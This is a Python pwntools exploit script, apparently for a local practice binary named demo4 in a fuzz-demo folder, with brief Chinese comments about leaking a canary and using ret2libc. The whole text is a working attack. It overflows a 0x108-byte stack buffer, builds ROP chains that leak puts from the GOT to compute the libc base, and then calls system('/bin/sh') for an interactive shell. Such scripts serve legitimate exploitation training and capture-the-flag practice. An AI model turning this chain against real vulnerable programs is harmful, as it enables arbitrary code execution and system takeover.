#encoding=utf-8
#canary涉及相关的逻辑操作，若有canary请自己泄露
#ubuntu-18 ret2libc system or orw
from pwn import *
context(log_level='debug',arch='amd64')
elf=ELF('./fuzz-demo/demo4')
libc=elf.libc
r=process('./fuzz-demo/demo4')
r.recv(timeout=1)
rdi=0x400773
rdx=next(libc.search(asm('pop rdx;ret')))
pop_rsi_r15_ret=0x400771
ret=0x4004e6
Hierarchical=0x400637
r.recv(timeout=1)
r.send(b'HRPSS')
r.recv(timeout=1)
r.sendline(b'224')
puts_got=elf.got['puts']
puts_plt=elf.plt['puts']
payload=b'a'*0x108+p64(rdi)+p64(puts_got)+p64(puts_plt)+p64(Hierarchical)
r.send(payload)
leak=u64(r.recvuntil(b'\x7f')[-6:].ljust(8,b'\x00'))
base=leak-libc.sym['puts']
sh=base+next(libc.search(b'/bin/sh'))
system=base+libc.sym['system']
payload2=b'a'*0x108+p64(rdi)+p64(sh)+p64(ret)+p64(system)+p64(Hierarchical)
r.send(payload2)
r.interactive()